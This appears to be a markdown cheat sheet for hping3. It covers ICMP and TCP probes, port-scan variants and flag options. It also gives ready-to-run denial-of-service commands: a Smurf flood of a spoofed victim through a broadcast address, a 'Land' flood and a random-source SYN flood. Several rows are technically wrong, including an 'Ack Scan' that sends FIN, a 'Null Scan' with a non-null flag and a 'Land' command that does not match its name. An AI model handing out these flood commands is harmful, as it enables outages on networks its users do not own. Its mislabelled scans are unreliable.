# Hping 
     * Supports TCP,UDP,ICMP
     * Firewall testing
     * Port scnning
     * Remote OS fingerprinting
     * Dos attacks

| Command   | Use   |
| ------------ | ------------ |
|hping3 -S 192.168.10.15 -p 80 -c 3   |ping   |
|hping3 -1 172.16.1.2   |normal ping utility, sending ICMP-echo und receiving ICMP-reply   |
|hping3 --traceroute -V -1 172.16.1.2   |similar to famous utilities like tracert (windows) or traceroute (linux)   |
|hping3 -V -S -p 80 -s 5050 172.16.1.2   |send a Syn packet to a specified port 80   |
|hping3 -c 1 -V -1 -C 17 172.16.1.2   |sends a ICMP address mask request ( Type 17 )   |
|hping3 -c 1 -V -p 80 -s 5050 -F 172.16.1.2   |Ack Scan: This scan can be used to see if a host is alive (when Ping is blocked for example). This should send a RST response back if the port is open   |
|hping3 -c 1 -V -p 80 -s 5050 -M 0 -UPF 172.16.1.2   |Xmas Scan: This scan sets the sequence number to zero and set the URG + PSH + FIN flags in the packet. If the target device's TCP port is closed, the target device sends a TCP RST packet in reply. If the target device's TCP port is open, the target discards the TCP Xmas scan, sending no reply   |
|hping3 -c 1 -V -p 80 -s 5050 -Y 172.16.1.2   |Null Scan: This scan sets the sequence number to zero and have no flags set in the packet. If the target device's TCP port is closed, the target device sends a TCP RST packet in reply. If the target device's TCP port is open, the target discards the TCP NULL scan, sending no reply   |
|hping3 -1 --flood -a VICTIM_IP BROADCAST_ADDRESS   |Smurf Attack: This is a type of denial-of-service attack that floods a target system via spoofed broadcast ping messages   |
|hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source 172.16.1.2   |DOS Land Attack   |
|hping3 --flood -S -V --rand-source 172.16.1.2   |DDOS attck (SYN)   |
|hping3 --scan 0-500 -S 172.16.1.2   |port scan (SYN)   |
|hping3 --scan 0-500 -X 172.16.1.2   |port scan (Xmas)   |

-  --flood: sent packets as fast as possible. Don't show replies.
-     --rand-dest: random destionation address mode. see the man.
-     -V <-- Verbose
-     -c --count: packet count
-     -d --data: data size
-     -S --syn: set SYN flag
-     -w --win: winsize (default 64)
-     -p --destport [+][+]<port> destination port(default 0) ctrl+z inc/dec
-     -s --baseport: base source port (default random) 
